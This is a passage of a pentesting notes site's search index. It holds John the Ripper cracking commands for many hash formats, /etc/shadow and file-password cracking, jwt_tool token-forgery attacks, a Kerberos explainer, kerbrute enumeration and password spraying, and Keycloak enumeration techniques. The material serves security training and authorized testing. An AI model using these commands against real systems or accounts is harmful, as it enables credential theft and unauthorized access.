--format=mysql-fast hashes_to_crack.txt</code> MySQL fast password hashes mysql <code>john --format=mysql hashes_to_crack.txt</code> MySQL password hashes mysql-sha1 <code>john --format=mysql-sha1 hashes_to_crack.txt</code> MySQL SHA1 password hashes NETLM <code>john --format=netlm hashes_to_crack.txt</code> NETLM (NT LAN Manager) password hashes NETLMv2 <code>john --format=netlmv2 hashes_to_crack.txt</code> NETLMv2 (NT LAN Manager version 2) password hashes NETNTLM <code>john --format=netntlm hashes_to_crack.txt</code> NETNTLM (NT LAN Manager) password hashes NETNTLMv2 <code>john --format=netntlmv2 hashes_to_crack.txt</code> NETNTLMv2 (NT LAN Manager version 2) password hashes NEThalfLM <code>john --format=nethalflm hashes_to_crack.txt</code> NEThalfLM (NT LAN Manager) password hashes md5ns <code>john --format=md5ns hashes_to_crack.txt</code> md5ns (MD5 namespace) password hashes nsldap <code>john --format=nsldap hashes_to_crack.txt</code> nsldap (OpenLDAP SHA) password hashes ssha <code>john --format=ssha hashes_to_crack.txt</code> ssha (Salted SHA) password hashes NT <code>john --format=nt hashes_to_crack.txt</code> NT (Windows NT) password hashes openssha <code>john --format=openssha hashes_to_crack.txt</code> OPENSSH private key password hashes oracle11 <code>john --format=oracle11 hashes_to_crack.txt</code> Oracle 11 password hashes oracle <code>john --format=oracle hashes_to_crack.txt</code> Oracle password hashes pdf <code>john --format=pdf hashes_to_crack.txt</code> PDF (Portable Document Format) password hashes phpass-md5 <code>john --format=phpass-md5 hashes_to_crack.txt</code> PHPass-MD5 (Portable PHP password hashing framework) password hashes phps <code>john --format=phps hashes_to_crack.txt</code> PHPS password hashes pix-md5 <code>john --format=pix-md5 hashes_to_crack.txt</code> Cisco PIX MD5 password hashes po <code>john --format=po hashes_to_crack.txt</code> Po (Sybase SQL Anywhere) password hashes rar <code>john --format=rar hashes_to_crack.txt</code> RAR (WinRAR) password hashes raw-md4 <code>john --format=raw-md4 hashes_to_crack.txt</code> Raw MD4 password hashes raw-md5 <code>john --format=raw-md5 hashes_to_crack.txt</code> Raw MD5 password hashes raw-md5-unicode <code>john --format=raw-md5-unicode hashes_to_crack.txt</code> Raw MD5 Unicode password hashes raw-sha1 <code>john --format=raw-sha1 hashes_to_crack.txt</code> Raw SHA1 password hashes raw-sha224 <code>john --format=raw-sha224 hashes_to_crack.txt</code> Raw SHA224 password hashes raw-sha256 <code>john --format=raw-sha256 hashes_to_crack.txt</code> Raw SHA256 password hashes raw-sha384 <code>john --format=raw-sha384 hashes_to_crack.txt</code> Raw SHA384 password hashes raw-sha512 <code>john --format=raw-sha512 hashes_to_crack.txt</code> Raw SHA512 password hashes salted-sha <code>john --format=salted-sha hashes_to_crack.txt</code> Salted SHA password hashes sapb <code>john --format=sapb hashes_to_crack.txt</code> SAP CODVN B (BCODE) password hashes sapg <code>john --format=sapg hashes_to_crack.txt</code> SAP CODVN G (PASSCODE) password hashes sha1-gen <code>john --format=sha1-gen hashes_to_crack.txt</code> Generic SHA1 password hashes skey <code>john --format=skey hashes_to_crack.txt</code> S/Key (One-time password) hashes ssh <code>john --format=ssh hashes_to_crack.txt</code> SSH (Secure Shell) password hashes sybasease <code>john --format=sybasease hashes_to_crack.txt</code> Sybase ASE password hashes xsha <code>john --format=xsha hashes_to_crack.txt</code> xsha (Extended SHA) password hashes zip <code>john --format=zip hashes_to_crack.txt</code> ZIP (WinZip) password hashes","tags":["pentesting","brute force","dictionary attack","enumeration"]},{"location":"john-the-ripper/#hash-wordlist-mode-attack","title":"Hash: Wordlist mode attack","text":"<pre><code>john --wordlist=&lt;wordlist_file&gt; --rules &lt;hash_file&gt;\n</code></pre> <p>Multiple wordlists can be specified by separating them with a comma.</p>","tags":["pentesting","brute force","dictionary attack","enumeration"]},{"location":"john-the-ripper/#hash-incremental-mode-attack","title":"Hash: Incremental mode attack","text":"<p>Incremental Mode is an advanced John mode used to crack passwords using a character set. It is a hybrid attack, which means it will attempt to match the password by trying all possible combinations of characters from the character set. This mode is the most effective yet most time-consuming of all the John modes.</p> <pre><code>john --incremental &lt;hash_file&gt;\n</code></pre> <p>Additionally, it is important to note that the default character set is limited to a-zA-Z0-9. Therefore, if we attempt to crack complex passwords with special characters, we need to use a custom character set.</p>","tags":["pentesting","brute force","dictionary attack","enumeration"]},{"location":"john-the-ripper/#crack-a-file","title":"Crack a file","text":"<p>For cracking files you have the following tools:</p> Tool Description <code>pdf2john</code> Converts PDF documents for John <code>ssh2john</code> Converts SSH private keys for John <code>mscash2john</code> Converts MS Cash hashes for John <code>keychain2john</code> Converts OS X keychain files for John <code>rar2john</code> Converts RAR archives for John <code>pfx2john</code> Converts PKCS#12 files for John <code>truecrypt_volume2john</code> Converts TrueCrypt volumes for John <code>keepass2john</code> Converts KeePass databases for John <code>vncpcap2john</code> Converts VNC PCAP files for John <code>putty2john</code> Converts PuTTY private keys for John <code>zip2john</code> Converts ZIP archives for John <code>hccap2john</code> Converts WPA/WPA2 handshake captures for John <code>office2john</code> Converts MS Office documents for John <code>wpa2john</code> Converts WPA/WPA2 handshakes for John <p>If you need addional ones, run:</p> <pre><code>locate *2john*\n</code></pre>","tags":["pentesting","brute force","dictionary attack","enumeration"]},{"location":"john-the-ripper/#basic-usage","title":"Basic usage","text":"<pre><code># Syntax. Three steps:\n# 1. Extract hash from file\n&lt;tool&gt; &lt;file_to_crack&gt; &gt; file.hash\n# 2. Crack the hash\njohn file.hash\n# 3. Another way to crack the hash\njohn --wordlist=&lt;wordlist.txt&gt; file.hash \n\n# Example with a pdf:\n# 1. Extract hash from file\npdf2john server_doc.pdf &gt; server_doc.hash\n# 2. Crack the hash\njohn server_doc.hash\n# 3. Another way to crack the hash\njohn --wordlist=&lt;wordlist.txt&gt; server_doc.hash \n</code></pre>","tags":["pentesting","brute force","dictionary attack","enumeration"]},{"location":"john-the-ripper/#brute-forcing-etcpasswd-and-etcshadow","title":"Brute forcing /etc/passwd and /etc/shadow","text":"<p>First, save /etc/passwd and john /etc/shadow from the victim machine to the attacker machine.</p> <p>Second, use unshadow to put users and passwords in the same file:</p> <pre><code>unshadow passwd shadow &gt; crackme\n# passwd: file saved with /etc/passwd content.\n# shadow: file saved with /etc/shadow content.\n</code></pre> <p>Third, run johtheripper. You can use a list of users or specific ones brute force:</p> <pre><code>john -incremental -users:&lt;userList&gt; &lt;fileToCrack&gt;\n\n# To display the passwords recovered:\njohn --show crackme\n\n# Default path to cracked password: /root/.john/john.pot\n\n# Dictionary attack\njohn -wordlist=&lt;file&gt; -users=victim1,victim2 -rules &lt;filetocrack&gt;\n# -rules parameter adds som mangling to the wordlist\n</code></pre>","tags":["pentesting","brute force","dictionary attack","enumeration"]},{"location":"john-the-ripper/#cracking-password-of-microsoft-word-file","title":"Cracking Password of Microsoft Word file","text":"<pre><code>cd /root/Desktop/\n/usr/share/john/office2john.py MS_Word_Document.docx &gt; hash\ncat hash\njohn --wordlist=/root/Desktop/wordlists/1000000-password-seclists.txt hash\n</code></pre>","tags":["pentesting","brute force","dictionary attack","enumeration"]},{"location":"john-the-ripper/#cracking-password-of-a-zip-file","title":"Cracking password of a zip file","text":"<pre><code>zip2john nameoffile.zip &gt; zip.hashes\ncat zip.hashes\njohn zip.hashes\n</code></pre>","tags":["pentesting","brute force","dictionary attack","enumeration"]},{"location":"jwt-tool/","title":"JWT tool","text":""},{"location":"jwt-tool/#jwt-attacks","title":"JWT attacks","text":"<p>Two tools: jwt.io and jwt_tools.</p> <p>To see a jwt decoded on your CLI:</p> <pre><code>jwt_tool eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJoYXBpaGFja2VyQGhhcGloYWNoZXIuY29tIiwiaWF0IjoxNjY5NDYxODk5LCJleHAiOjE2Njk\n1NDgyOTl9.yeyJzdWIiOiJoYXBpaGFja2VyQGhhcGloYWNoZXIuY29tIiwiaWF0IjoxNjY5NDYxODk5LCJleHAiOjE2Njk121Lj2Doa7rA9oUQk1Px7b2hUCMQJeyCsGYLbJ8hZMWc7304aX_hfkLB__1o2YfU49VajMBhhRVP_OYNafttug \n</code></pre> <p>Result:</p> <p></p> <p>Also, to see the decoded jwt, knowing that is encoded in base64, we could echo each of its parts:</p> <pre><code>echo eyJhbGciOiJIUzUxMiJ9 | base64 -d  &amp;&amp; echo eyJzdWIiOiJoYXBpaGFja2VyQGhhcGloYWNoZXIuY29tIiwiaWF0\nIjoxNjY5NDYxODk5LCJleHAiOjE2Njk1NDgyOTl9 | base64 -d\n</code></pre> <p>Results:</p> <pre><code>{\"alg\":\"HS512\"}{\"sub\":\"hapihacker@hapihacher.com\",\"iat\":1669461899,\"exp\":1669548299} \n</code></pre> <p>To run a JWT scan with jwt_tool, run: </p> <pre><code>jwt_tool -t &lt;http://target-site.com/&gt; -rh \"&lt;Header&gt;: &lt;JWT_Token&gt;\" -M pb\n# in the target site specify a path that leverages a call to a token\n# replace Header with the name of the Header and JWT_Tocker with the actual token.\n# -M: Scanning mode. 'pb' is playbook audit. 'er': fuzz existing claims to force errors. 'cc': fuzz common claims. 'at': All tests.\n</code></pre> <p>Example:</p> <p></p> <p>Some more jwt_tool flags that may come in hand:</p> <pre><code># -X EXPLOIT, --exploit EXPLOIT\n#                        eXploit known vulnerabilities:\n#                        a = alg:none\n#                        n = null signature\n#                        b = blank password accepted in signature\n#                        s = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\n#                        k = key confusion (specify public key with -pk)\n#                        i = inject inline JWKS\n</code></pre>"},{"location":"jwt-tool/#the-none-attack","title":"The none attack","text":"<p>A JWT with \"none\" as its algorithm is a free ticket. Modify user and become admin, root,...  Also, in poorly implemented JWT, sometimes user and password can be found in the payload.</p> <p>To craft a jwt with \"none\" as the value for \"alg\", run:</p> <pre><code>jwt_tool &lt;JWT_Token&gt; -X a\n</code></pre>"},{"location":"jwt-tool/#the-null-signature-attack","title":"The null signature attack","text":"<p>Second attack in this section is removing the signature from the token. This can be done by erasing the signature altogether and leaving the last period in place.</p>"},{"location":"jwt-tool/#the-blank-password-accepted-in-signature","title":"The blank password accepted in signature","text":"<p>Launching this attack is relatively simple. Just remove the password value from the payload and leave it in blank. Then, regenerate the jwt.</p> <p>Also, with jwt_tool, run:</p> <pre><code>jwt_tool &lt;JWT_Token&gt; -X b\n</code></pre>"},{"location":"jwt-tool/#the-algorithm-switch-or-key-confusion-attack","title":"The algorithm switch (or key-confusion) attack","text":"<p>A more likely scenario than the provider accepting no algorithm is that they accept multiple algorithms. For example, if the provider uses RS256 but doesn\u2019t limit the acceptable algorithm values, we could alter the algorithm to HS256. This is useful, as RS256 is an asymmetric encryption scheme, meaning we need both the provider\u2019s private key and a public key in order to accurately hash the JWT signature. Meanwhile, HS256 is symmetric encryption, so only one key is used for both the signature and verification of the token. If you can discover the provider\u2019s RS256 public key and then switch the algorithm from RS256 to HS256, there is a chance you may be able to leverage the RS256 public key as the HS256 key.</p> <pre><code>jwt_tool &lt;JWT_Token&gt; -X k -pk public-key.pem\n# You will need to save the captured public key as a file on your attacking machine.\n</code></pre>"},{"location":"jwt-tool/#the-jwt-crack-attack","title":"The jwt crack attack","text":"<p>JWT_Tool can still test 12 million passwords in under a minute. To perform a JWT Crack attack using JWT_Tool, use the following command:</p> <pre><code>jwt_tool &lt;JWT Token&gt; -C -d /wordlist.txt\n# -C indicates that you are conducting a hash crack attack\n# -d specifies the dictionary or wordlist\n</code></pre> <p>You can generate this wordlist for the secret signature of the json web token by using crunch.</p> <p>Once you crack the secret of the signature, we can create our own trusted tokens.  1. Grab another user email (in the crapi app, from the data exposure vulnerability when getting the forum (GET {{baseUrl}}/community/api/v2/community/posts/recent). 2. Generate a token with the secret.</p>"},{"location":"jwt-tool/#spoofing-jwks","title":"Spoofing JWKS","text":"<p>Specify JWS URL with -ju, or set in jwtconf.ini to automate this attack.</p>"},{"location":"jwt-tool/#inject-inline-jwks","title":"Inject inline JWKS","text":""},{"location":"kerberos-authentication/","title":"Kerberos Authentication","text":"<p>Sources for this notes</p> <ul> <li>Hackndo</li> <li>Hack the Box Module</li> </ul>","tags":["active","directory","ldap","windows","kerberos","authentication"]},{"location":"kerberos-authentication/#how-it-works","title":"How it works","text":"<p>Active Directory is a Microsoft solution used for Windows network management, and provides the following services:</p> <ul> <li>Directory service (LDAP)</li> <li>Authentication (Kerberos)</li> <li>Name resolution (DNS)</li> <li>Homogeneous software policy</li> </ul> <p>Kerberos is used whenever a user wants to access some services on the network. Thanks to Kerberos the user won\u2019t need to type his password every time and the server won\u2019t need to know every user\u2019s password. This is centralized authentication.</p> <p>In order to do this, at least three entities are required</p> <ul> <li>A\u00a0client</li> <li>A\u00a0service</li> <li> <p>A\u00a0Key Distribution Center\u00a0(KDC) which is a\u00a0Domain Controller\u00a0(DC) in Active Directory environment.</p> </li> <li> <p>Authentication Service (AS): The client must authenticate itself to the KDC. </p> </li> <li>Ticket-Granting Ticket (TGT): He must then request a ticket to access the chosen service (e.g. CIFS, HTTP, SQL, \u2026).</li> <li>Application Request (AP): He finally uses the service by providing the ticket.</li> </ul> <p></p>","tags":["active","directory","ldap","windows","kerberos","authentication"]},{"location":"kerberos-authentication/#authentication-service-as","title":"Authentication Service (AS)","text":"<p>We are in Active Directory context, so the KDC is also the Domain Controller (DC). The KDC contains all the domain information, including the secrets of each service, machine, user. Thus, except for the DC, everyone only know his own secret, and therefore do not know the secrets of the other objects in Active Directory.</p> <p></p>","tags":["active","directory","ldap","windows","kerberos","authentication"]},{"location":"kerberos-authentication/#krb_as_req","title":"KRB_AS_REQ","text":"<p>User <code>pixis</code>\u00a0will first send a request for a\u00a0Ticket Granting Ticket\u00a0(TGT) to the Domain Controller (DC). How? By sending  - its name - a timespan encrypted with a hashed version of its password.</p> <p>This request is called\u00a0KRB_AS_REQ\u00a0(Kerberos Authentication Service Request).</p> <p></p> <p>The Key Distribution Center (KDC) will receive this username, and will verify that it exists in its database.</p> <p>If it finds it, it will then retrieve\u00a0<code>pixis</code>\u00a0hashed password which it will use to try to decrypt encrypted timestamp. If it can\u2019t, then the client didn\u2019t use the correct password to encrypt this timestamp.</p> <p>If it does, however, the KDC is assured that it is really\u00a0<code>pixis</code>\u00a0who is talking to him. It will generate a unique session key tied to this user and limited in time.</p> <p></p>","tags":["active","directory","ldap","windows","kerberos","authentication"]},{"location":"kerberos-authentication/#krb_as_rep","title":"KRB_AS_REP","text":"<p>The Key Distribution Center (KDC) sends back different things to\u00a0<code>pixis</code>\u00a0(KRB_AS_REP).</p> <ul> <li>The\u00a0session key, encrypted with\u00a0<code>pixis</code>\u00a0hashed password;</li> <li> <p>The\u00a0TGT, containing various information like:</p> <ul> <li>Username (pixis)</li> <li>Validity period</li> <li>Generated session key</li> <li>The\u00a0Privilege Attribute Certificate\u00a0(PAC) which contains a lot of specific information about the user, including his identifier (SID) and all the groups he is member of.</li> </ul> <p>TGT will be encrypted with the KDC key. Thus,\u00a0only the KDC is able to decipher and read this ticket\u2019s content.</p> </li> </ul> <p></p> <p>The client receives these pieces of information. Using his hashed password, the first part will be decrypted in order to retrieve the session key that will be necessary for further exchanges.</p>","tags":["active","directory","ldap","windows","kerberos","authentication"]},{"location":"kerberos-authentication/#ticket-granting-service-tgs","title":"Ticket-Granting Service (TGS)","text":"<p>Now the user has his own key as well as a time-limited session key that only he currently knows, and a KDC-encrypted TGT that contains, among other things, this same session key.</p> <p></p>","tags":["active","directory","ldap","windows","kerberos","authentication"]},{"location":"kerberos-authentication/#krb_tgs_req","title":"KRB_TGS_REQ","text":"<p>When\u00a0<code>pixis</code>\u00a0wants to use a service, e.g.\u00a0<code>CIFS</code>\u00a0on\u00a0<code>SERVER01</code>, it will send several pieces of information to the KDC so that the KDC can send back a Service Ticket:</p> <p></p> <ul> <li>The TGT;</li> <li>The service he wants to use and the associated host, so\u00a0<code>CIFS/SERV01</code>\u00a0in this example;</li> <li>An\u00a0authenticator, which contains his username and current timestamp, all encrypted with the session key.</li> </ul> <p>Now the Key Distribution Center (KDC) will compare TGT and authenticator contents. Since only the KDC can read TGT content, it could not have been tampered with. The KDC will read TGT content, including the TGT\u2019s owner and the associated session key. Then it will decrypt authenticator content with the same session key. If the decryption works, and the data in the authenticator matches the data in the TGT, then pixis is who it claims to be. The KDC is assured that whoever made the request has the TGT and knowledge of the negotiated session key.</p> <p></p>","tags":["active","directory","ldap","windows","kerberos","authentication"]},{"location":"kerberos-authentication/#krb_tgs_rep","title":"KRB_TGS_REP","text":"<p>Now that the KDC has been able to verify that the user is\u00a0<code>pixis</code>, it will respond to \u00a0<code>pixis</code> with the KRB_TGS_REP containing:</p> <ul> <li>The Ticket Granting Service (TGS)  containing:<ul> <li>The name and host of the requested service (<code>CIFS/SERV01</code>)</li> <li>An encrypted part (encrypted with the service\u2019s key (i.e. the host key, since CIFS service runs under the host account);) with:<ul> <li>user\u2019s username (<code>pixis</code>)</li> <li>the PAC,</li> <li>and a new session key which is only valid for communications between\u00a0<code>pixis</code>\u00a0and\u00a0<code>SERVER01</code>\u00a0for a certain period of time.  </li> </ul> </li> </ul> </li> <li>A new session key</li> </ul> <p>These two pieces of information (the ticket and the session key) are encrypted with the first session key, the one that was initially exchanged between the KDC and the client.</p> <p></p> <p>The client will receive this message, and will be able to decrypt the first layer to get the session key created for communication with the service, as well as the Ticket Granting Service (TGS) generated to use this service. </p> <p></p>","tags":["active","directory","ldap","windows","kerberos","authentication"]},{"location":"kerberos-authentication/#application-request-ap","title":"Application Request (AP)","text":"","tags":["active","directory","ldap","windows","kerberos","authentication"]},{"location":"kerberos-authentication/#krb_ap_req","title":"KRB_AP_REQ","text":"<p>Now when the client wants to use the service, he will generate a new authenticator with this new session key.</p> <p></p> <p>service receives the TGS and can decrypt it with its own secret.</p> <p></p>","tags":["active","directory","ldap","windows","kerberos","authentication"]},{"location":"kerberos-authentication/#summary","title":"Summary","text":"","tags":["active","directory","ldap","windows","kerberos","authentication"]},{"location":"kerbrute/","title":"Kerbrute","text":"<p>It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. \u00a0This method does not generate Windows event ID\u00a04625: An account failed to log on, or a logon failure which is often monitored for.</p> <p>How it works?</p> <p>Basically, the tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. If the KDC responds with the error\u00a0<code>PRINCIPAL UNKNOWN</code>, the username is invalid. Whenever the KDC prompts for Kerberos Pre-Authentication, this signals that the username exists, and the tool will mark it as valid.</p> <p>This method of username enumeration does not cause logon failures and will not lock out accounts.</p> <pre><code>sudo git clone https://github.com/ropnop/kerbrute.git\n\n# Typing make help will show us the compiling options available.\ncd kerbrute\nmake help\n\n# type make all and compile one each for use on Linux, Windows, and Mac systems (an x86 and x64 version for each).\nsudo make all\n\n# The newly created dist directory will contain our compiled binaries.\nls -la dist\n</code></pre> <pre><code>#############\n# FOR LINUX\n#############\n\n# Add the tool to our PATH to make it accessible from anywhere in the host. For that we make sure first of the PATH\necho $PATH\n\n# and then we move the binary to a path, for instance\nsudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute\n\n\n\n#############\n# FOR WINDOWS\n#############\n# Copy the file to the windows pivoting machine\nscp kerbrute_windows_amd64.exe username@$ip:~/\n</code></pre>","tags":["windows","enumeration","active directory"]},{"location":"kerbrute/#basic-commands","title":"Basic commands","text":"<pre><code># User enumeration \nkerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users\n# -d: domain\n# --dc: domain controller\n# -o: output file\n\n# Password spraying attack with kerbrute\nkerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1\n</code></pre> <p>However, using Kerbrute for username enumeration will generate event ID\u00a04768: A Kerberos authentication ticket (TGT) was requested.  Defenders can tune their SIEM tools to look for an influx of this event ID.</p>","tags":["windows","enumeration","active directory"]},{"location":"kernel-vulnerability-exploitation/","title":"Kernel vulnerability exploitation","text":"System vulnerability Exploit Ubuntu 16.04 LTS Exploit 39772 Ubuntu 18.04 LTS + lxd lxd privilege escalation","tags":["pentesting","privilege escalation","linux"]},{"location":"keycloak-pentesting/","title":"Pentesting Keycloak","text":"<p>Keycloak is an open-source Identity and Access Management (IAM) solution. It allows easy implementation of single sign-on for web applications and APIs.</p> Sources <ul> <li>https://www.surecloud.com/resources/blog/pentesting-keycloak-part-1</li> </ul>","tags":["wordpress","keycloak"]},{"location":"keycloak-pentesting/#fingerprint-and-enumeration","title":"Fingerprint and enumeration","text":"","tags":["wordpress","keycloak"]},{"location":"keycloak-pentesting/#keycloak-running","title":"Keycloak running...","text":"<p>For assessing an environment running Keycloak, we will need first to fingerprint it, meaning to identify that we are facing a keycloak implementation and to determine which version is. For that:</p> <ol> <li>Cookie Name \u2013 Once logged in with valid credentials, pay attention to cookies.</li> <li>URLs: Keycloak has a very distinctive URL.</li> <li>JWT Payload: Even if this is an OAuth requirement, the JWT could also give you a hint that you\u2019re using Keycloak, just by looking at sections like \u2018resource_access\u2019 and \u2018scope\u2019.</li> <li>Page Source: Finally, you might also find references of /keycloak/ in the source code of the login page.</li> </ol>","tags":["wordpress","keycloak"]},{"location":"keycloak-pentesting/#version","title":"Version","text":"<p>At the moment, there is no way to identify the running Keycloak version by looking at it from an unauthenticated perspective. The only way is via an administrative account (with the correct JWT token in the request header): GET /auth/admin/serverinfo.</p> <p>The latest stable version of Keycloak is available at https://www.keycloak.org/downloads \u2013 Make sure the client is running the latest. If not, check if there are public CVEs and/or exploits on:</p> <p>https://repology.org/project/keycloak/cves https://www.cvedetails.com/version-list/16498/37999/1/Keycloak-Keycloak.html https://www.exploit-db.com/</p>","tags":["wordpress","keycloak"]},{"location":"keycloak-pentesting/#enumeration","title":"Enumeration","text":"","tags":["wordpress","keycloak"]},{"location":"keycloak-pentesting/#openid-configuration-saml-descriptor","title":"OpenID Configuration / SAML Descriptor","text":"<pre><code>/auth/realms/&lt;realm_name&gt;/.well-known/openid-configuration /auth/realms/&lt;realm_name&gt;/protocol/saml/descriptor\n</code></pre> <p>For public keys:</p> <pre><code>/auth/realms/&lt;realm_name&gt;/\n</code></pre>","tags":["wordpress","keycloak"]},{"location":"keycloak-pentesting/#realms","title":"Realms","text":"<p>A realm manages a set of users, credentials, roles, and groups. A user belongs to and logs into a realm. Realms are isolated from one another and can only manage and authenticate the users that they control.</p> <p>When you boot Keycloak for the first time, Keycloak creates a pre-defined realm for you. This initial realm is the master realm \u2013 the highest level in the hierarchy of realms. Admin accounts in this realm have permissions to view and manage any other realm created on the server instance. When you define your initial admin account, you create an account in the master realm. Your initial login to the admin console will also be via the master realm.</p> <p>It is not recommended to configure a web application\u2019s SSO on the default master realm for security and granularity.  Realms can be easily enumerated, but that\u2019s a default behaviour of the platform. Obtaining a list of valid realms might be useful later on in the assessment.</p> <p>It is possible to enumerate via Burp Suite Intruder on the following URL:</p> <pre><code>/auth/realms/&lt;realm_name&gt;/\n</code></pre> <p>A possible dictionary: https://raw.githubusercontent.com/chrislockard/api_wordlist/master/objects.txt.</p> <p>Realms can be configured to allow user self-registration. This is not an issue itself and is often advertised in the login page:</p> <p>If the application is using a custom template for the login page, hiding the registration link, we can still try to directly access the registration link, which is:</p> <p>/auth/realms//login-actions/registration?client_id=&amp;tab_id= <p>Of course, disabling self-registration in a production environment is recommended.</p>","tags":["wordpress","keycloak"]},{"location":"keycloak-pentesting/#clients-id","title":"Clients ID+","text":"<p>Clients are entities that can request Keycloak to authenticate a user. Most often, clients are applications and services that want to use Keycloak to secure themselves and provide a single sign-on solution. Clients can also be entities that just want to request identity information or an access token so that they can securely invoke other services on the network that Keycloak secures. </p> <p>Each realm (identified below) might have a different set of client ids.</p> <p>When landing on a login page of a realm, the URL will be auto-filled with the default \u2018client_id\u2019 and \u2018scope\u2019 parameters, e.g.:</p> <pre><code>/auth/realms/&lt;realm_name&gt;/protocol/openid-connect/auth?**client_id=account-console**&amp;redirect_uri=&lt;...&gt;&amp;state=&lt;...&gt;&amp;response_mode=&lt;...&gt;&amp;response_type=&lt;...&gt;&amp;**scope=openid**&amp;nonce=&lt;...&gt;&amp;code_challenge=&lt;...&gt;&amp;code_challenge_method=&lt;...&gt;\n</code></pre> <p>We can use here some dictionaries.</p> <p>Additionally, the following default client ids should also be available upon Keycloak installation:</p> <pre><code>account\naccount-console\naccounts\naccounts-console\nadmin\nadmin-cli\nbroker\nbrokers\nrealm-management\nrealms-management\nsecurity-admin-console\n</code></pre> <p>No HTTP response code could help us to identify a valid client_id from a wrong one. We should focus on whether the length of the response differs from the majority of the responses.</p> <p>This process should be repeated for each valid realm identified in previous steps.</p> <p>Clients can be configured with different Access Types:</p> <ul> <li>Bearer-Only\u00a0\u2013 Used for backend servers and API (requests that already contain a token/secret in the request header)</li> <li>Public\u00a0\u2013 Able to initiate login flaw (Auth flow to get an access token) and does not hold or send any secrets</li> <li>Confidential\u00a0\u2013 Used for backend servers and able to initiate login flaw. Can accept or send secrets.</li> </ul> <p>Therefore, when we encounter a \u201cclient_secret\u201d parameter in the login request, we\u2019re probably looking at a client with a Confidential or Bearer-Only Access Type. </p>","tags":["wordpress","keycloak"]},{"location":"keycloak-pentesting/#scopes","title":"Scopes","text":"<p>When a client is registered, you must define protocol mappers and role scope mappings for that client. It is often useful to store a client scope to make creating new clients easier by sharing some common settings. This is also useful for requesting some claims or roles to be conditionally based on the value of the scope parameter. Keycloak provides the concept of a client scope for this.</p> <p>When landing on a login page of a realm, the URL will be auto-filled with the default \u2018client_id\u2019 and \u2018scope\u2019 parameters, e.g.:</p> <pre><code>/auth/realms/&lt;realm_name&gt;/protocol/openid-connect/auth?**client_id=account-console**&amp;redirect_uri=&lt;...&gt;&amp;state=&lt;...&gt;&amp;response_mode=&lt;...&gt;&amp;response_type=&lt;...&gt;&amp;**scope=openid**&amp;nonce=&lt;...&gt;&amp;code_challenge=&lt;...&gt;&amp;code_challenge_method=&lt;...&gt;\n</code></pre> <p>It is possible to identify additional scopes via Burp Suite Intruder, by keeping all the other parameters with the same value:</p> <p>The following, additional, default scopes should also be available upon KeyCloak installation:</p> <pre><code>address  \naddresses  \nemail  \nemails  \nmicroprofile-jwt  \noffline_access  \nphone  \nopenid  \nprofile  \nrole_list  \nroles  \nrole  \nweb-origin  \nweb-origins\n</code></pre> <p>It is quite straight forward to identify valid scopes from non-valid scopes by looking at the content length or status code.</p> <p>This process should be repeated for each realm identified in previous steps.</p> <p>It should be noted that valid scopes can be concatenated within the URL prior of the login, e.g.:</p> <p><code>...&amp;scope=openid+offline_access+roles+email+phone+profile+address+web-origins&amp;...</code></p> <p>This will \u2018force\u2019 Keycloak to grant any available/additional scope, for such realm \u2013 but also depending on the user\u2019s role configuration.</p>","tags":["wordpress","keycloak"]},{"location":"keycloak-pentesting/#grants","title":"Grants","text":"<p>OAuth 2 provides several \u2018grant types\u2019 for different use cases. The grant types defined are:</p> <ul> <li>Authorization Code for apps running on a web server, browser-based and mobile apps</li> <li>Password for logging in with a username and password (only for first-party apps)</li> <li>Client credentials for application access without a user present</li> <li>Implicit was previously recommended for clients without a secret, but has been superseded by using the Authorization Code grant with PKCE</li> </ul> <p>A good resource to understand use cases of grants is available from\u00a0Aaron Parecki.\u00a0</p> <p>Grants cannot be enumerated and are as follow:</p> <p>authorization_code password client_credentials refresh_token implicit urn:ietf:params:oauth:grant-type:device_code urn:openid:params:grant-type:ciba</p>","tags":["wordpress","keycloak"]},{"location":"keycloak-pentesting/#identity-provider","title":"Identity Provider","text":"<p>Keycloak can be configured to delegate authentication to one or more Identity Providers (IDPs). Social login via Facebook or Google+ is an example of an identity provider federation. You can also hook Keycloak to delegate authentication to any other OpenID Connect or SAML 2.0 IDP.</p>","tags":["wordpress","keycloak"]},{"location":"keycloak-pentesting/#identity-provider-enumeration","title":"Identity Provider Enumeration","text":"<p>There are a number of external identity providers that can be configured within Keycloak. The URL to use within Intruder is:</p> <p>/auth/realms//broker//endpoint   <p></p> <p>The full list of default IDP names is as follow:</p> <p>gitlab github facebook google linkedin instagram microsoft bitbucket twitter openshift-v4 openshift-v3 paypal stackoverflow saml oidc keycloak-oidc  </p> <p> </p> <p>Once again, the status codes might differ, but the length will disclose which IDP is enabled. It should be noted that, by default, the login page will disclose which IDPs are enabled:</p> <p></p>","tags":["wordpress","keycloak"]},{"location":"keycloak-pentesting/#roles","title":"Roles","text":"<p>Roles identify a type or category of user. Admin, user, manager, and employee are all typical roles that may exist in an organization. Applications often assign access and permissions to specific roles rather than individual users as dealing with users can be too fine-grained and hard to manage.</p> <p>Roles cannot be easily enumerated from an unauthenticated perspective. They are usually visible within the JWT token of the user upon successful login:</p> <p></p> <p>The above image shows that \u2018account\u2019 client_id has, by default, 2 roles.</p> <p>Realm Default Roles:</p> <p>default-roles- offline_access uma_authorization <p>Client ID Default Roles:</p> <p>manage-account manage-account-links delete-account manage-content view-applications view-consent view-profile read-token create-client impersonation manage-authorization manage-clients manage-events</p>","tags":["wordpress","keycloak"]},{"location":"keycloak-pentesting/#user-email-enumeration-auth","title":"User Email Enumeration (auth)","text":"<p>It is possible to enumerate valid email addresses from an authenticated perspective via Keycloak\u2019s account page (if enabled for the logged-in user), available at:</p> <p>/auth/realms//account/#/personal-info   <p> </p> <p>When changing the email address to an already existing value, the system will return 409 Conflict. If the email is not in use, the system will return \u2018204 \u2013 No Content\u2019. Please note that, if Email Verification is enabled, this will send out a confirmation email to all email addresses we\u2019re going to test.</p> <p>This process can be easily automated via Intruder and no CSRF token is needed to perform this action:</p> <p></p> <p>If the template of the account console was changed to not show the personal information page, you might want to try firing up the request via:</p> <p>POST /auth/realms//account/ HTTP/1.1 Host:  Content-Type: application/json Authorization: Bearer  Origin:  Content-Length: 635 Connection: close Cookie:  <p>{ \"id\": \"\", \"username\": \"myuser\", 